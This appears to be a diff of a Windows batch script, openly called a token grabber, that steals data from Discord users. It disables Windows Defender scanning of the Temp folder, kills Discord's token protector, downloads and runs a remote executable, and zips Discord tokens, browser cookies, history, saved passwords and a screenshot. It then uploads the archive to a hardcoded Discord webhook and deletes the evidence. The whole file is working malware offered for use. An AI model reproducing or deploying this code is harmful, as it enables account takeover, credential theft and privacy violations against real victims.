@@ -1,6 +1,6 @@
 @echo off
 :: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
-set webhook=YOUR_WEBHOOK_HERE
+set webhook=https://discordapp.com/api/webhooks/1020814175112536084/eKoM05Czt2y2Eq4KhKw-XuE3Q2oNbCljIP2ZRfUCOA8pQ8yFhxaRMgIsblywiuiDxHOd
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
 ::get ip
 curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
@@ -27,14 +27,6 @@ netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
 ::sends the username, ip, current time, and date of the victim
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
-::sends all files
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
 
 taskkill /im Discord.exe /f
 taskkill /im DiscordTokenProtector.exe /f
@@ -64,16 +56,14 @@ echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
-powershell -Command "Invoke-WebRequest https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.0/main.exe -OutFile %userprofile%\AppData\Local\Temp\main.exe"
+powershell -Command "Invoke-WebRequest https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe -OutFile %userprofile%\AppData\Local\Temp\main.exe"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 timeout 3 >NUL
 start main.exe %webhook%
 timeout 3 >NUL
 taskkill /f /im main.exe
 
-
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```PC WAS INJECTED TO %webhook% HAVE FUN ```\"}" %webhook%
+powershell -Command "Compress-Archive -Path $env:TEMP\tokens.txt, $env:TEMP\browser-cookies.txt, $env:TEMP\browser-history.txt, $env:TEMP\browser-passwords.txt, $env:TEMP\desktop-screenshot.png, $env:TEMP\System_INFO.txt, $env:TEMP\sysi.txt, $env:TEMP\ip.txt, $env:TEMP\netstat.txt, $env:TEMP\programms.txt, $env:TEMP\uuid.txt -DestinationPath $env:TEMP\damnKDot.zip -CompressionLevel Optimal -Update" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\damnKDot.zip %webhook%
 
 del %userprofile%\AppData\Local\Temp\tokens.txt
 del %localappdata%\Temp\ip.txt
@@ -84,3 +74,9 @@ del %localappdata%\Temp\netstat.txt
 del %localappdata%\Temp\programms.txt
 del %localappdata%\Temp\uuid.txt
 del %localappdata%\Temp\main.exe
+del %localappdata%\Temp\wlan.txt
+del %localappdata%\Temp\browser-cookies.txt
+del %localappdata%\Temp\browser-history.txt
+del %localappdata%\Temp\browser-passwords.txt
+del %localappdata%\Temp\desktop-screenshot.png
+del %localappdata%\Temp\damnKDot.zip
